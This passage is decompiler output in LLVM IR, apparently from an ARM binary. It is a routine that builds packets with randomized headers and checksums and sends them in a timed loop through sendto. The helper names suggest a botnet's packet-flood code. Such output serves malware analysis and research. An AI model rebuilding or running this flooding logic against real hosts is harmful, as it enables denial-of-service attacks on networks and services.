  %v0_a9a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a9a8 = trunc i32 %v0_a9a8 to i8
  %v2_a9a8 = load i32, i32* %r0.global-to-local, align 4
  %v3_a9a8 = add i32 %v2_a9a8, 12
  %v4_a9a8 = inttoptr i32 %v3_a9a8 to i8*
  store i8 %v1_a9a8, i8* %v4_a9a8, align 1
  %v0_a9ac = load i32, i32* %r4.global-to-local, align 4
  %v1_a9ac = add i32 %v0_a9ac, 38
  %v2_a9ac = inttoptr i32 %v1_a9ac to i8*
  %v3_a9ac = load i8, i8* %v2_a9ac, align 1
  %tmp86 = urem i8 %v3_a9ac, 16
  %v1_a9b0 = zext i8 %tmp86 to i32
  %v1_a9b4 = or i32 %v1_a9b0, 64
  store i32 %v1_a9b4, i32* %r3.global-to-local, align 4
  %v1_a9b8 = trunc i32 %v1_a9b4 to i8
  store i8 %v1_a9b8, i8* %v2_a9ac, align 1
  %v0_a9bc = load i32, i32* %r4.global-to-local, align 4
  %v1_a9bc = add i32 %v0_a9bc, 38
  %v2_a9bc = inttoptr i32 %v1_a9bc to i8*
  %v3_a9bc = load i8, i8* %v2_a9bc, align 1
  %v4_a9bc = zext i8 %v3_a9bc to i32
  %v1_a9c0 = and i32 %v4_a9bc, 240
  %v1_a9c4 = or i32 %v1_a9c0, 5
  store i32 %v1_a9c4, i32* %r2.global-to-local, align 4
  %v1_a9c8 = trunc i32 %v1_a9c4 to i8
  store i8 %v1_a9c8, i8* %v2_a9bc, align 1
  store i32 %v4_a948, i32* %ip.global-to-local, align 4
  %v0_a9d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_a9d0 = add i32 %v0_a9d0, 38
  store i32 %v1_a9d0, i32* @r5, align 4
  %v3_a9d4 = add i32 %v0_a9d0, 39
  %v4_a9d4 = inttoptr i32 %v3_a9d4 to i8*
  store i8 %v5_a6d0, i8* %v4_a9d4, align 1
  store i32 %v5_a8d0, i32* %lr.global-to-local, align 4
  %v2_a9dc = load i32, i32* @r5, align 4
  %v3_a9dc = add i32 %v2_a9dc, 2
  %v4_a9dc = inttoptr i32 %v3_a9dc to i16*
  store i16 %v5_a8e8, i16* %v4_a9dc, align 2
  store i32 %v1_a6f4, i32* %r1.global-to-local, align 4
  %v0_a9e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a9e4, label %.thread8, label %bb78

.thread8:                                         ; preds = %.thread
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb79

bb78:                                             ; preds = %.thread
  store i32 64, i32* %r2.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v3_a9ec = load i32, i32* @r5, align 4
  %v4_a9ec = add i32 %v3_a9ec, 6
  %v5_a9ec = inttoptr i32 %v4_a9ec to i16*
  store i16 64, i16* %v5_a9ec, align 2
  %v0_a9f0.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t85 = trunc i32 %v0_a9f0.pre to i8
  br label %bb79

bb79:                                             ; preds = %.thread8, %bb78
  %v5_a6ec.sink.off0 = phi i8 [ %v1_a954, %.thread8 ], [ %extract.t85, %bb78 ]
  %v2_a9f0 = load i32, i32* @r5, align 4
  %v3_a9f0 = add i32 %v2_a9f0, 8
  %v4_a9f0 = inttoptr i32 %v3_a9f0 to i8*
  store i8 %v5_a6ec.sink.off0, i8* %v4_a9f0, align 1
  %v0_a9f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a9f4 = trunc i32 %v0_a9f4 to i8
  %v2_a9f4 = load i32, i32* @r5, align 4
  %v3_a9f4 = add i32 %v2_a9f4, 9
  %v4_a9f4 = inttoptr i32 %v3_a9f4 to i8*
  store i8 %v1_a9f4, i8* %v4_a9f4, align 1
  %v0_a9f8 = load i32, i32* @fp, align 4
  %v1_a9f8 = trunc i32 %v0_a9f8 to i16
  %v2_a9f8 = load i32, i32* @r5, align 4
  %v3_a9f8 = add i32 %v2_a9f8, 4
  %v4_a9f8 = inttoptr i32 %v3_a9f8 to i16*
  store i16 %v1_a9f8, i16* %v4_a9f8, align 2
  %v0_a9fc = call i32 @rand_next()
  store i32 %v0_a9fc, i32* %r0.global-to-local, align 4
  store i32 %v1_a828, i32* %ip.global-to-local, align 4
  store i1 %v2_aa08, i1* %cpsr_z.global-to-local, align 1
  %v1_aa0c = sub i32 1023, %v0_a9fc
  store i32 %v1_aa0c, i32* %r3.global-to-local, align 4
  br i1 %v2_aa08, label %.thread9, label %.thread10

.thread9:                                         ; preds = %bb79
  %v2_aa14 = load i32, i32* @r5, align 4
  %v3_aa14 = add i32 %v2_aa14, 16
  %v4_aa14 = inttoptr i32 %v3_aa14 to i32*
  store i32 %v1_aa0c, i32* %v4_aa14, align 4
  br label %bb80

.thread10:                                        ; preds = %bb79
  %v1_aa10 = load i32, i32* %r4.global-to-local, align 4
  %v2_aa10 = add i32 %v1_aa10, 16
  %v3_aa10 = inttoptr i32 %v2_aa10 to i32*
  %v4_aa10 = load i32, i32* %v3_aa10, align 4
  store i32 %v4_aa10, i32* %r3.global-to-local, align 4
  %v2_aa18 = load i32, i32* @r5, align 4
  %v3_aa18 = add i32 %v2_aa18, 16
  %v4_aa18 = inttoptr i32 %v3_aa18 to i32*
  store i32 %v4_aa10, i32* %v4_aa18, align 4
  br label %bb80

bb80:                                             ; preds = %.thread9, %.thread10
  %v1_aa1c = load i32, i32* @r5, align 4
  %v2_aa1c = add i32 %v1_aa1c, 12
  %v3_aa1c = inttoptr i32 %v2_aa1c to i32*
  store i32 %v0_a9fc, i32* %v3_aa1c, align 4
  %v3_aa20 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa20, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v0_aa28 = load i32, i32* %r4.global-to-local, align 4
  %v1_aa28 = add i32 %v0_aa28, 58
  store i32 %v1_aa28, i32* @r6, align 4
  store i32 %v4_aa2c, i32* %r1.global-to-local, align 4
  %v1_aa30 = add i32 %v3_aa20, 1
  store i32 %v1_aa30, i32* @r4, align 4
  store i32 %v4_aa34, i32* %r2.global-to-local, align 4
  %v9_aa38 = icmp eq i32 %v1_aa30, %arg2
  store i1 %v9_aa38, i1* %cpsr_z.global-to-local, align 1
  %v0_aa3c = load i32, i32* @r8, align 4
  %v1_aa3c = trunc i32 %v0_aa3c to i16
  %v3_aa3c = add i32 %v0_aa28, 62
  %v4_aa3c = inttoptr i32 %v3_aa3c to i16*
  store i16 %v1_aa3c, i16* %v4_aa3c, align 2
  %v0_aa40 = load i32, i32* %r1.global-to-local, align 4
  %v1_aa40 = trunc i32 %v0_aa40 to i16
  %v2_aa40 = load i32, i32* @r6, align 4
  %v3_aa40 = inttoptr i32 %v2_aa40 to i16*
  store i16 %v1_aa40, i16* %v3_aa40, align 2
  %v0_aa44 = load i32, i32* %r2.global-to-local, align 4
  %v1_aa44 = trunc i32 %v0_aa44 to i16
  %v2_aa44 = load i32, i32* @r6, align 4
  %v3_aa44 = add i32 %v2_aa44, 2
  %v4_aa44 = inttoptr i32 %v3_aa44 to i16*
  store i16 %v1_aa44, i16* %v4_aa44, align 2
  %v0_aa48 = load i32, i32* @r4, align 4
  store i32 %v0_aa48, i32* %stack_var_-44, align 4
  %v5_aa4c = icmp slt i32 %v1_aa30, %arg2
  br i1 %v5_aa4c, label %dec_label_pc_a8f4, label %dec_label_pc_aa50.preheader

dec_label_pc_aa50.preheader:                      ; preds = %bb80, %dec_label_pc_a814
  %v1_aa6c = add i32 %v5_a764, 8
  %v1_aa70 = add i32 %v5_a764, 66
  %v2_aa7c = icmp eq i32 %v5_a7b8, -1
  %v7_aa7c = icmp eq i32 %v5_a7b8, -1
  %v3_ac74 = icmp eq i32 %v3_a82c, 65535
  %v2_acc4 = icmp eq i32 %v1_a828, 0
  %v2_aad8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_aaf0 = ptrtoint i32* %stack_var_-52 to i32
  %v2_ab00 = ptrtoint i32* %stack_var_-56 to i32
  %v2_ab0c = ptrtoint i32* %stack_var_-54 to i32
  %v2_ab20 = icmp eq i32 %v1_a784, 0
  br label %dec_label_pc_aa50

dec_label_pc_aa50:                                ; preds = %dec_label_pc_aa50.preheader, %dec_label_pc_ad04
  store i1 %v2_a838, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a838, label %dec_label_pc_ad04, label %dec_label_pc_aa64

dec_label_pc_aa64:                                ; preds = %dec_label_pc_aa50
  store i32 %v5_a764, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_aa6c, i32* @fp, align 4
  store i32 %v1_aa70, i32* @sb, align 4
  br label %dec_label_pc_abd8

dec_label_pc_aa78:                                ; preds = %dec_label_pc_abd8
  store i32 %v5_a7b8, i32* %r1.global-to-local, align 4
  store i1 %v7_aa7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa7c, label %dec_label_pc_ac64, label %dec_label_pc_aa84

dec_label_pc_aa84:                                ; preds = %dec_label_pc_ac04, %dec_label_pc_aa78
  store i32 %v3_a82c, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_ac74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ac74, label %dec_label_pc_ac80, label %dec_label_pc_aa98

dec_label_pc_aa98:                                ; preds = %dec_label_pc_ac64.dec_label_pc_aa98_crit_edge, %dec_label_pc_aa84
  %v1_aa9c = phi i32 [ %v1_aa9c.pre, %dec_label_pc_ac64.dec_label_pc_aa98_crit_edge ], [ 65535, %dec_label_pc_aa84 ]
  store i32 %v3_a830, i32* %r3.global-to-local, align 4
  %v9_aa9c = icmp eq i32 %v3_a830, %v1_aa9c
  store i1 %v9_aa9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa9c, label %dec_label_pc_aca8, label %dec_label_pc_aaa4

dec_label_pc_aaa4:                                ; preds = %dec_label_pc_ac80, %dec_label_pc_aa98
  %v1_aaa8 = phi i32 [ %v1_aca0, %dec_label_pc_ac80 ], [ %v1_aa9c, %dec_label_pc_aa98 ]
  store i32 %v3_a834, i32* %ip.global-to-local, align 4
  %v9_aaa8 = icmp eq i32 %v3_a834, %v1_aaa8
  store i1 %v9_aaa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aaa8, label %dec_label_pc_acbc, label %dec_label_pc_aab0

dec_label_pc_aab0:                                ; preds = %dec_label_pc_aca8, %dec_label_pc_aaa4
  store i32 %v1_a828, i32* @lr, align 4
  store i1 %v2_acc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_acc4, label %dec_label_pc_acd8, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_aab0
  %v1_aab8 = load i32, i32* @r5, align 4
  %v2_aab8 = add i32 %v1_aab8, 16
  %v3_aab8 = inttoptr i32 %v2_aab8 to i32*
  %v4_aab8 = load i32, i32* %v3_aab8, align 4
  store i32 %v4_aab8, i32* %r3.global-to-local, align 4
  %v2_aabc = load i32, i32* @r6, align 4
  %v3_aabc = add i32 %v2_aabc, 16
  %v4_aabc = inttoptr i32 %v3_aabc to i32*
  store i32 %v4_aab8, i32* %v4_aabc, align 4
  br label %dec_label_pc_aac4

dec_label_pc_aac4:                                ; preds = %bb81, %.thread11, %dec_label_pc_acd8
  %v0_aac4 = call i32 @rand_next()
  store i32 %v0_aac4, i32* %r0.global-to-local, align 4
  store i32 %v0_aac4, i32* %stack_var_-48, align 4
  %v0_aacc = call i32 @rand_next()
  store i32 %v0_aacc, i32* %r0.global-to-local, align 4
  store i32 %v0_aacc, i32* %stack_var_-52, align 4
  %v0_aad4 = call i32 @rand_next()
  store i32 %v2_aad8, i32* %r1.global-to-local, align 4
  store i32 %v0_aad4, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_aae4 = load i32, i32* @r7, align 4
  store i32 %v0_aae4, i32* %r0.global-to-local, align 4
  %v3_aae8 = call i32 @util_memcpy(i32 %v0_aae4, i32 %v2_aad8, i32 4)
  %v0_aaec = load i32, i32* @r7, align 4
  %v1_aaec = add i32 %v0_aaec, 6
  store i32 %v1_aaec, i32* %r0.global-to-local, align 4
  store i32 %v2_aaf0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_aaf8 = call i32 @util_memcpy(i32 %v1_aaec, i32 %v2_aaf0, i32 4)
  %v0_aafc = load i32, i32* @r7, align 4
  %v1_aafc = add i32 %v0_aafc, 4
  store i32 %v1_aafc, i32* %r0.global-to-local, align 4
  store i32 %v2_ab00, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_ab08 = call i32 @util_memcpy(i32 %v1_aafc, i32 %v2_ab00, i32 2)
  store i32 %v2_ab0c, i32* %r1.global-to-local, align 4
  %v0_ab10 = load i32, i32* @r7, align 4
  %v1_ab10 = add i32 %v0_ab10, 10
  store i32 %v1_ab10, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_ab18 = call i32 @util_memcpy(i32 %v1_ab10, i32 %v2_ab0c, i32 2)
  store i32 %v3_ab18, i32* %r0.global-to-local, align 4
  store i32 %v1_a784, i32* %r1.global-to-local, align 4
  store i1 %v2_ab20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ab20, label %dec_label_pc_ab28, label %dec_label_pc_ace4

dec_label_pc_ab28:                                ; preds = %dec_label_pc_aac4, %dec_label_pc_ace4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ab2c = load i32, i32* @r5, align 4
  %v3_ab2c = add i32 %v2_ab2c, 10
  %v4_ab2c = inttoptr i32 %v3_ab2c to i16*
  store i16 0, i16* %v4_ab2c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_ab34 = load i32, i32* @r5, align 4
  store i32 %v0_ab34, i32* @r0, align 4
  %v2_ab38 = call i32 @checksum_generic(i32 %v0_ab34, i32 20)
  %v3_ab38 = trunc i32 %v2_ab38 to i16
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_ab40 = load i32, i32* @r5, align 4
  %v4_ab40 = add i32 %v3_ab40, 10
  %v5_ab40 = inttoptr i32 %v4_ab40 to i16*
  store i16 %v3_ab38, i16* %v5_ab40, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_ab48 = load i32, i32* %ip.global-to-local, align 4
  %v1_ab48 = trunc i32 %v0_ab48 to i16
  %v2_ab48 = load i32, i32* @r6, align 4
  %v3_ab48 = add i32 %v2_ab48, 10
  %v4_ab48 = inttoptr i32 %v3_ab48 to i16*
  store i16 %v1_ab48, i16* %v4_ab48, align 2
  %v0_ab4c = load i32, i32* @r6, align 4
  store i32 %v0_ab4c, i32* @r0, align 4
  %v2_ab50 = call i32 @checksum_generic(i32 %v0_ab4c, i32 20)
  %v3_ab50 = trunc i32 %v2_ab50 to i16
  store i32 %v2_ab50, i32* %r0.global-to-local, align 4
  %v3_ab54 = load i32, i32* @r6, align 4
  %v4_ab54 = add i32 %v3_ab54, 10
  %v5_ab54 = inttoptr i32 %v4_ab54 to i16*
  store i16 %v3_ab50, i16* %v5_ab54, align 2
  %v2_ab5c = load i32, i32* @r8, align 4
  %v3_ab5c = add i32 %v2_ab5c, 6
  %v4_ab5c = inttoptr i32 %v3_ab5c to i16*
  store i16 0, i16* %v4_ab5c, align 2
  %v0_ab60 = load i32, i32* @r8, align 4
  store i32 %v0_ab60, i32* @r1, align 4
  %v1_ab64 = add i32 %v0_ab60, 4
  %v2_ab64 = inttoptr i32 %v1_ab64 to i16*
  %v3_ab64 = load i16, i16* %v2_ab64, align 2
  %v4_ab64 = zext i16 %v3_ab64 to i32
  store i32 %v4_ab64, i32* %r2.global-to-local, align 4
  %v0_ab68 = load i32, i32* @fp, align 4
  store i32 %v0_ab68, i32* %r3.global-to-local, align 4
  %v0_ab6c = load i32, i32* @r6, align 4
  store i32 %v0_ab6c, i32* %r0.global-to-local, align 4
  %v4_ab70 = call i32 @checksum_tcpudp(i32 %v0_ab6c, i32 %v0_ab60, i32 %v4_ab64, i32 %v0_ab68)
  %v5_ab70 = trunc i32 %v4_ab70 to i16
  store i32 %v4_ab70, i32* %r0.global-to-local, align 4
  %v3_ab74 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ab74, i32* %r2.global-to-local, align 4
  %v3_ab78 = mul i32 %v3_ab74, 32
  store i32 %v3_ab78, i32* %r3.global-to-local, align 4
  %v0_ab7c = load i32, i32* @r5, align 4
  %v1_ab7c = add i32 %v0_ab7c, 16
  %v2_ab7c = inttoptr i32 %v1_ab7c to i32*
  %v3_ab7c = load i32, i32* %v2_ab7c, align 4
  %v5_ab80 = mul i32 %v3_ab74, 24
  store i32 %v5_ab80, i32* %r3.global-to-local, align 4
  %v1_ab84 = load i32, i32* @sl, align 4
  %v2_ab84 = add i32 %v1_ab84, %v5_ab80
  store i32 %v2_ab84, i32* @lr, align 4
  %v2_ab88 = add i32 %v2_ab84, 4
  %v3_ab88 = inttoptr i32 %v2_ab88 to i32*
  store i32 %v3_ab7c, i32* %v3_ab88, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_ab94 = load i32, i32* @r8, align 4
  %v4_ab94 = add i32 %v3_ab94, 6
  %v5_ab94 = inttoptr i32 %v4_ab94 to i16*
  store i16 %v5_ab70, i16* %v5_ab94, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ab9c = load i32, i32* %r1.global-to-local, align 4
  %v1_ab9c = trunc i32 %v0_ab9c to i16
  %v2_ab9c = load i32, i32* %r3.global-to-local, align 4
  %v3_ab9c = load i32, i32* @sl, align 4
  %v4_ab9c = add i32 %v3_ab9c, %v2_ab9c
  %v5_ab9c = inttoptr i32 %v4_ab9c to i16*
  store i16 %v1_ab9c, i16* %v5_ab9c, align 2
  %v0_aba0 = load i32, i32* %r2.global-to-local, align 4
  %v1_aba0 = trunc i32 %v0_aba0 to i16
  %v2_aba0 = load i32, i32* @lr, align 4
  %v3_aba0 = add i32 %v2_aba0, 2
  %v4_aba0 = inttoptr i32 %v3_aba0 to i16*
  store i16 %v1_aba0, i16* %v4_aba0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_aba8 = load i32, i32* @r5, align 4
  store i32 %v0_aba8, i32* %r1.global-to-local, align 4
  store i32 %v3_a7dc, i32* %r0.global-to-local, align 4
  %v0_abb0 = load i32, i32* @sb, align 4
  store i32 %v0_abb0, i32* %r2.global-to-local, align 4
  %v0_abb4 = load i32, i32* @lr, align 4
  %v0_abb8 = load i32, i32* %ip.global-to-local, align 4
  %v6_abbc = call i32 @__libc_sendto(i32 %v3_a7dc, i32 %v0_aba8, i32 %v0_abb0, i32 16384, i32 %v0_abb4, i32 %v0_abb8)
  %v3_abc0 = load i32, i32* %stack_var_-44, align 4
  %v1_abc4 = add i32 %v3_abc0, 1
  store i32 %v1_abc4, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v9_abcc = icmp eq i32 %v1_abc4, %arg2
  store i1 %v9_abcc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_abc4, i32* %stack_var_-44, align 4
  %v6_abd4 = icmp slt i32 %v1_abc4, %arg2
  br i1 %v6_abd4, label %dec_label_pc_abd8, label %dec_label_pc_ad04

dec_label_pc_abd8:                                ; preds = %dec_label_pc_ab28, %dec_label_pc_aa64
  %v1_abec = phi i32 [ %v1_abc4, %dec_label_pc_ab28 ], [ 0, %dec_label_pc_aa64 ]
  %v5_abdc = mul i32 %v1_abec, 24
  %v1_abe0 = load i32, i32* @sl, align 4
  %v2_abe0 = add i32 %v1_abe0, %v5_abdc
  store i32 %v2_abe0, i32* %r3.global-to-local, align 4
  store i32 %v2_a698, i32* %lr.global-to-local, align 4
  %v1_abe8 = add i32 %v2_abe0, 20
  %v2_abe8 = inttoptr i32 %v1_abe8 to i8*
  %v3_abe8 = load i8, i8* %v2_abe8, align 1
  %v4_abe8 = zext i8 %v3_abe8 to i32
  store i32 %v4_abe8, i32* %r2.global-to-local, align 4
  %v4_abec = mul i32 %v1_abec, 4
  %v5_abec = add i32 %v4_abec, %v2_a698
  %v6_abec = inttoptr i32 %v5_abec to i32*
  %v7_abec = load i32, i32* %v6_abec, align 4
  store i32 %v7_abec, i32* @r5, align 4
  %v2_abf0 = icmp ugt i8 %v3_abe8, 30
  %v7_abf0 = icmp eq i8 %v3_abe8, 31
  store i1 %v7_abf0, i1* %cpsr_z.global-to-local, align 1
  %v1_abf4 = add i32 %v7_abec, 24
  store i32 %v1_abf4, i32* @r7, align 4
  %v1_abf8 = add i32 %v7_abec, 38
  store i32 %v1_abf8, i32* @r6, align 4
  %v1_abfc = add i32 %v7_abec, 58
  store i32 %v1_abfc, i32* @r8, align 4
  %v2_ac00 = xor i1 %v7_abf0, true
  %v3_ac00 = and i1 %v2_abf0, %v2_ac00
  br i1 %v3_ac00, label %dec_label_pc_aa78, label %dec_label_pc_ac04

dec_label_pc_ac04:                                ; preds = %dec_label_pc_abd8
  %v1_ac04 = add i32 %v2_abe0, 16
  %v2_ac04 = inttoptr i32 %v1_ac04 to i32*
  %v3_ac04 = load i32, i32* %v2_ac04, align 4
  store i32 %v3_ac04, i32* %r4.global-to-local, align 4
  %v0_ac08 = call i32 @rand_next()
  store i32 %v0_ac08, i32* %r0.global-to-local, align 4
  %v3_ac0c = load i32, i32* %stack_var_-44, align 4
  %v5_ac14 = mul i32 %v3_ac0c, 24
  %v1_ac18 = and i32 %v3_ac04, 16711680
  store i32 %v1_ac18, i32* %ip.global-to-local, align 4
  %v3_ac1c = udiv i32 %v3_ac04, 16777216
  %v4_ac20 = udiv i32 %v1_ac18, 256
  %v5_ac20 = or i32 %v4_ac20, %v3_ac1c
  store i32 %v5_ac20, i32* %r2.global-to-local, align 4
  %v1_ac24 = load i32, i32* @sl, align 4
  %v2_ac24 = add i32 %v1_ac24, %v5_ac14
  store i32 %v2_ac24, i32* %r1.global-to-local, align 4
  %v1_ac28 = and i32 %v3_ac04, 65280
  store i32 %v1_ac28, i32* %r3.global-to-local, align 4
  %v1_ac2c = add i32 %v2_ac24, 20
  %v2_ac2c = inttoptr i32 %v1_ac2c to i8*
  %v3_ac2c = load i8, i8* %v2_ac2c, align 1
  %v4_ac2c = zext i8 %v3_ac2c to i32
  store i32 %v4_ac2c, i32* %ip.global-to-local, align 4
  %v5_ac34 = call i32 @llvm.bswap.i32(i32 %v3_ac04)
  %v7_ac38 = lshr i32 %v0_ac08, %v4_ac2c
  %v8_ac38 = add i32 %v7_ac38, %v5_ac34
  store i32 %v8_ac38, i32* %r2.global-to-local, align 4
  %v1_ac3c = and i32 %v8_ac38, 16711680
  store i32 %v1_ac3c, i32* %r0.global-to-local, align 4
  store i32 %v5_a7b8, i32* %r1.global-to-local, align 4
  %v5_ac54 = call i32 @llvm.bswap.i32(i32 %v8_ac38)
  store i32 %v5_ac54, i32* %r3.global-to-local, align 4
  store i1 %v7_aa7c, i1* %cpsr_z.global-to-local, align 1
  %v1_ac5c = load i32, i32* @r5, align 4
  %v2_ac5c = add i32 %v1_ac5c, 16
  %v3_ac5c = inttoptr i32 %v2_ac5c to i32*
  store i32 %v5_ac54, i32* %v3_ac5c, align 4
  br i1 %v2_aa7c, label %dec_label_pc_ac64, label %dec_label_pc_aa84

dec_label_pc_ac64:                                ; preds = %dec_label_pc_ac04, %dec_label_pc_aa78
  %v0_ac64 = call i32 @rand_next()
  store i32 %v0_ac64, i32* %r0.global-to-local, align 4
  store i32 %v3_a82c, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_ac74, i1* %cpsr_z.global-to-local, align 1
  %v1_ac78 = load i32, i32* @r5, align 4
  %v2_ac78 = add i32 %v1_ac78, 12
  %v3_ac78 = inttoptr i32 %v2_ac78 to i32*
  store i32 %v0_ac64, i32* %v3_ac78, align 4
  br i1 %v3_ac74, label %dec_label_pc_ac80, label %dec_label_pc_ac64.dec_label_pc_aa98_crit_edge

dec_label_pc_ac64.dec_label_pc_aa98_crit_edge:    ; preds = %dec_label_pc_ac64
  %v1_aa9c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_aa98

dec_label_pc_ac80:                                ; preds = %dec_label_pc_ac64, %dec_label_pc_aa84
  %v0_ac80 = call i32 @rand_next()
  %v3_ac88 = urem i32 %v0_ac80, 65536
  store i32 %v3_ac88, i32* %r0.global-to-local, align 4
  %v1_ac90 = sub nsw i32 999, %v3_ac88
  store i32 %v1_ac90, i32* %r3.global-to-local, align 4
  %v1_ac94 = trunc i32 %v0_ac80 to i16
  %v2_ac94 = load i32, i32* @r5, align 4
  %v3_ac94 = add i32 %v2_ac94, 4
  %v4_ac94 = inttoptr i32 %v3_ac94 to i16*
  store i16 %v1_ac94, i16* %v4_ac94, align 2
  %v0_ac98 = load i32, i32* %r3.global-to-local, align 4
  %v1_ac98 = trunc i32 %v0_ac98 to i16
  %v2_ac98 = load i32, i32* @r6, align 4
  %v3_ac98 = add i32 %v2_ac98, 4
  %v4_ac98 = inttoptr i32 %v3_ac98 to i16*
  store i16 %v1_ac98, i16* %v4_ac98, align 2
  store i32 %v3_a830, i32* %r3.global-to-local, align 4
  %v1_aca0 = load i32, i32* @r4, align 4
  %v9_aca0 = icmp eq i32 %v3_a830, %v1_aca0
  store i1 %v9_aca0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aca0, label %dec_label_pc_aca8, label %dec_label_pc_aaa4

dec_label_pc_aca8:                                ; preds = %dec_label_pc_ac80, %dec_label_pc_aa98
  %v0_aca8 = call i32 @rand_next()
  %v1_aca8 = trunc i32 %v0_aca8 to i16
  store i32 %v0_aca8, i32* %r0.global-to-local, align 4
  store i32 %v3_a834, i32* %ip.global-to-local, align 4
  %v1_acb0 = load i32, i32* @r4, align 4
  %v9_acb0 = icmp eq i32 %v3_a834, %v1_acb0
  store i1 %v9_acb0, i1* %cpsr_z.global-to-local, align 1
  %v3_acb4 = load i32, i32* @r5, align 4
  %v4_acb4 = add i32 %v3_acb4, 58
  %v5_acb4 = inttoptr i32 %v4_acb4 to i16*
  store i16 %v1_aca8, i16* %v5_acb4, align 2
  br i1 %v9_acb0, label %dec_label_pc_acbc, label %dec_label_pc_aab0

dec_label_pc_acbc:                                ; preds = %dec_label_pc_aca8, %dec_label_pc_aaa4
  %v0_acbc = call i32 @rand_next()
  %v1_acbc = trunc i32 %v0_acbc to i16
  store i32 %v0_acbc, i32* %r0.global-to-local, align 4
  store i32 %v1_a828, i32* @lr, align 4
  store i1 %v2_acc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_acc4, label %.thread24, label %bb81

.thread24:                                        ; preds = %dec_label_pc_acbc
  %v3_accc25 = load i32, i32* @r8, align 4
  %v4_accc26 = add i32 %v3_accc25, 2
  %v5_accc27 = inttoptr i32 %v4_accc26 to i16*
  store i16 %v1_acbc, i16* %v5_accc27, align 2
  br label %dec_label_pc_acd8

bb81:                                             ; preds = %dec_label_pc_acbc
  %v1_acc8 = load i32, i32* @r5, align 4
  %v2_acc8 = add i32 %v1_acc8, 16
  %v3_acc8 = inttoptr i32 %v2_acc8 to i32*
  %v4_acc8 = load i32, i32* %v3_acc8, align 4
  store i32 %v4_acc8, i32* %r3.global-to-local, align 4
  %v3_accc = load i32, i32* @r8, align 4
  %v4_accc = add i32 %v3_accc, 2
  %v5_accc = inttoptr i32 %v4_accc to i16*
  store i16 %v1_acbc, i16* %v5_accc, align 2
  %v1_acd0 = load i32, i32* %r3.global-to-local, align 4
  %v2_acd0 = load i32, i32* @r6, align 4
  %v3_acd0 = add i32 %v2_acd0, 16
  %v4_acd0 = inttoptr i32 %v3_acd0 to i32*
  store i32 %v1_acd0, i32* %v4_acd0, align 4
  br label %dec_label_pc_aac4

dec_label_pc_acd8:                                ; preds = %.thread24, %dec_label_pc_aab0
  %v0_acd8 = call i32 @rand_next()
  store i32 %v0_acd8, i32* %r0.global-to-local, align 4
  %v1_acdc = load i32, i32* @r6, align 4
  %v2_acdc = add i32 %v1_acdc, 16
  %v3_acdc = inttoptr i32 %v2_acdc to i32*
  store i32 %v0_acd8, i32* %v3_acdc, align 4
  br label %dec_label_pc_aac4

dec_label_pc_ace4:                                ; preds = %dec_label_pc_aac4
  %v0_ace4 = load i32, i32* @r8, align 4
  %v1_ace4 = add i32 %v0_ace4, 8
  store i32 %v1_ace4, i32* @r4, align 4
  store i32 %v1_ace4, i32* %r0.global-to-local, align 4
  store i32 %v5_a764, i32* %r1.global-to-local, align 4
  %v2_acf0 = call i32 @rand_alphastr(i32 %v1_ace4, i32 %v5_a764)
  store i32 %v2_acf0, i32* %r0.global-to-local, align 4
  store i32 %v5_a764, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_acfc = load i32, i32* @r4, align 4
  %v4_acfc = add i32 %v2_acfc, %v5_a764
  %v5_acfc = inttoptr i32 %v4_acfc to i8*
  store i8 0, i8* %v5_acfc, align 1
  br label %dec_label_pc_ab28

dec_label_pc_ad04:                                ; preds = %dec_label_pc_ab28, %dec_label_pc_aa50
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_ad08 = call i32 @__GI_time(i32* null)
  store i32 %v2_ad08, i32* %r0.global-to-local, align 4
  store i32 %v2_a7c8, i32* %ip.global-to-local, align 4
  %v9_ad10 = icmp eq i32 %v2_a7c8, %v2_ad08
  store i1 %v9_ad10, i1* %cpsr_z.global-to-local, align 1
  %v6_ad14 = icmp slt i32 %v2_a7c8, %v2_ad08
